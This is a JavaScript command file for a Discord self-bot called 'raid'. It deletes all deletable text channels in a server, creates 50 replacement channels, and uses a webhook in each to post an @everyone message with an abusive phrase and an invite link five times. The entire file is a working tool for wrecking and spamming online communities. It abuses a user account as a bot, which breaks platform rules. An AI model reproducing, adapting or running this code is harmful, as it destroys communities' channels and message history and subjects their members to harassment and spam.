const config = require("../config.json"); // Ensure you have your config file for user ID

module.exports = {
  name: "raid",
  description: "Spams a message in multiple newly created channels.",

  async execute(message, args, activeAutoReacts) {
    if (message.author.id !== config.userId) {
      if (message.author.id !== config.userId) return; // Do nothing if the user doesn't have permission
    }
    const spamMessage =
      "@everyone laceit. owns this bitch fn  join https://discord.gg/A8vBTT83kz";
    const channelName = "laceitownsts";
    const numberOfChannels = 50;
    const spamCount = 5;

    // Ensure the bot (self-bot user) is in a guild
    if (!message.guild) {
      return message.reply("This command can only be executed in a server.");
    }

    // Check if the self-bot has Manage Channels permissions
    const member = message.guild.members.cache.get(message.author.id);
    if (!member.permissions.has("MANAGE_CHANNELS")) {
      return message.reply("You don't have permission to manage channels!");
    }

    try {
      // Delete all channels in the guild
      const channels = message.guild.channels.cache.filter(
        (channel) => channel.deletable && channel.type === "GUILD_TEXT"
      );
      for (const channel of channels.values()) {
        await channel.delete((reason = "Cleaning up channels for raid"));
        console.log(`Deleted channel: ${channel.name}`);
      }
      console.log(`Deleted ${channels.size} channels.`);

      // Create new channels and spam messages
      for (let i = 0; i < numberOfChannels; i++) {
        const newChannel = await message.guild.channels.create(channelName, {
          type: "GUILD_TEXT",
          reason: "Creating channels for raiding",
        });
        console.log(`Created channel: ${newChannel.name}`);

        // Create a webhook in the new channel
        const webhook = await newChannel.createWebhook("my son laceit.", {
          avatar: "",
        });
        console.log(`Created webhook: ${webhook.name} in ${newChannel.name}`);

        // Spam the message using the webhook
        for (let j = 0; j < spamCount; j++) {
          await webhook.send(spamMessage);
          console.log("Spammed message:", spamMessage);
        }
      }

      console.log("Raid completed successfully.");
      message.channel.send("Raid completed successfully.");
    } catch (error) {
      console.error(`Failed to execute raid command. Error: ${error}`);
      message.channel.send("Raid operation failed.  check the logs.");
    }
  },
};
